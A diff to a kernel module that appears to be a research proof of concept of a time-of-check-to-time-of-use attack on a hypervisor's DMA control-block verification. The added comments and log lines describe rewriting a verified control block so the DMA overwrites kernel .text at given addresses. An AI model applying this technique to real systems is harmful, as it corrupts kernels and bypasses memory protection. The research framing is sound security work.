@@ -688,6 +688,15 @@ done:
  *
  * This demonstrates the fundamental TOCTOU vulnerability:
  * verification and execution are NOT atomic.
+ *
+ * ATTACK SCENARIO (as per MyTEE paper):
+ * - Attacker has compromised the hypervisor
+ * - Driver uses legitimate MyTEE APIs (mytee_up_priv)
+ * - Hypervisor (under attacker control) modifies CB after verification
+ * - DMA executes with modified CB, bypassing protection
+ *
+ * The attack code in hyp-stub.S (label 215) represents the
+ * compromised hypervisor behavior.
  */
 
 static int do_attack(void)
@@ -703,16 +712,23 @@ static int do_attack(void)
     struct dma_cb *cb;
     
     pr_info("[TOCTOU] ========================================\n");
-    pr_info("[TOCTOU] TOCTOU Attack - Hypervisor CB Modification\n");
+    pr_info("[TOCTOU] TOCTOU Attack - Compromised Hypervisor\n");
     pr_info("[TOCTOU] ========================================\n");
     pr_info("[TOCTOU] \n");
+    pr_info("[TOCTOU] ATTACK SCENARIO:\n");
+    pr_info("[TOCTOU]   Assumption: Attacker has compromised the hypervisor\n");
+    pr_info("[TOCTOU]   (hyp-stub.S label 215 represents malicious code)\n");
+    pr_info("[TOCTOU] \n");
     pr_info("[TOCTOU] Attack flow:\n");
-    pr_info("[TOCTOU]   1. Set attack enable flag in shared memory\n");
-    pr_info("[TOCTOU]   2. Prepare legitimate CB with ALLOWED destination\n");
-    pr_info("[TOCTOU]   3. Trigger DMA → hypervisor traps\n");
+    pr_info("[TOCTOU]   1. Driver prepares legitimate CB (ALLOWED destination)\n");
+    pr_info("[TOCTOU]   2. DMA write triggers hypervisor trap\n");
+    pr_info("[TOCTOU]   3. Hypervisor copies CB to secure buffer\n");
     pr_info("[TOCTOU]   4. Hypervisor verifies CB → PASSES\n");
-    pr_info("[TOCTOU]   5. Hypervisor modifies CB.dst → FORBIDDEN!\n");
-    pr_info("[TOCTOU]   6. DMA executes with modified CB\n");
+    pr_info("[TOCTOU]   5. [COMPROMISED] Hypervisor modifies CB.dst → KERNEL .TEXT!\n");
+    pr_info("[TOCTOU]   6. DMA executes with modified CB → KERNEL CORRUPTION!\n");
+    pr_info("[TOCTOU] \n");
+    pr_info("[TOCTOU] Target: 0x00200000 (kernel .text physical address)\n");
+    pr_info("[TOCTOU] This will corrupt kernel executable code!\n");
     pr_info("[TOCTOU] \n");
     
     /* Clear previous results */
@@ -796,12 +812,19 @@ static int do_attack(void)
     pr_info("[TOCTOU] Starting DMA on channel %d\n", ATTACK_DMA_CHANNEL);
     pr_info("[TOCTOU] CB address: 0x%08x (bus)\n", cb_bus_addr);
     pr_info("[TOCTOU] \n");
-    pr_info("[TOCTOU] *** DMA WRITE TO CONBLK_AD TRIGGERS HYPERVISOR! ***\n");
-    pr_info("[TOCTOU] Hypervisor will:\n");
+    pr_info("[TOCTOU] *** DMA WRITE TO CONBLK_AD TRIGGERS HYPERVISOR TRAP ***\n");
+    pr_info("[TOCTOU] \n");
+    pr_info("[TOCTOU] Normal hypervisor flow:\n");
     pr_info("[TOCTOU]   1. Copy CB to secure buffer\n");
     pr_info("[TOCTOU]   2. Verify CB addresses → PASS (dst is allowed)\n");
-    pr_info("[TOCTOU]   3. MODIFY CB.dst to 0xC0008000 (FORBIDDEN!)\n");
-    pr_info("[TOCTOU]   4. Continue DMA execution with modified CB\n");
+    pr_info("[TOCTOU]   3. Execute DMA with verified CB\n");
+    pr_info("[TOCTOU] \n");
+    pr_info("[TOCTOU] COMPROMISED hypervisor (our attack):\n");
+    pr_info("[TOCTOU]   1. Copy CB to secure buffer\n");
+    pr_info("[TOCTOU]   2. Verify CB addresses → PASS\n");
+    pr_info("[TOCTOU]   3. MODIFY CB.dst to 0xC0200000 (kernel .text!)\n");
+    pr_info("[TOCTOU]   4. MODIFY CB.length to 4096 bytes!\n");
+    pr_info("[TOCTOU]   5. Execute DMA → CORRUPTS KERNEL CODE!\n");
     pr_info("[TOCTOU] \n");
     
     /* Set CB address - THIS TRIGGERS HYPERVISOR TRAP! */
@@ -873,13 +896,17 @@ static int do_attack(void)
         pr_info("[TOCTOU] ╔════════════════════════════════════════╗\n");
         pr_info("[TOCTOU] ║  ★★★ TOCTOU ATTACK SUCCESSFUL! ★★★   ║\n");
         pr_info("[TOCTOU] ╠════════════════════════════════════════╣\n");
-        pr_info("[TOCTOU] ║  DMA filter was BYPASSED!              ║\n");
+        pr_info("[TOCTOU] ║  Compromised hypervisor bypassed DMA   ║\n");
+        pr_info("[TOCTOU] ║  verification and corrupted kernel!    ║\n");
         pr_info("[TOCTOU] ╚════════════════════════════════════════╝\n");
         pr_info("[TOCTOU] \n");
-        pr_info("[TOCTOU] PROOF:\n");
-        pr_info("[TOCTOU]   1. CB verified with ALLOWED destination\n");
-        pr_info("[TOCTOU]   2. Hypervisor modified CB to FORBIDDEN dest\n");
-        pr_info("[TOCTOU]   3. DMA executed with modified CB!\n");
+        pr_info("[TOCTOU] PROOF OF CONCEPT:\n");
+        pr_info("[TOCTOU]   1. CB was verified with ALLOWED destination\n");
+        pr_info("[TOCTOU]   2. Compromised hypervisor modified CB.dst to kernel .text\n");
+        pr_info("[TOCTOU]   3. DMA wrote garbage to kernel executable code!\n");
+        pr_info("[TOCTOU] \n");
+        pr_info("[TOCTOU] If system is still running, kernel .text may be cached.\n");
+        pr_info("[TOCTOU] Try executing any command to trigger crash.\n");
         pr_info("[TOCTOU] \n");
         pr_info("[TOCTOU] The TOCTOU vulnerability is CONFIRMED.\n");
     } else {
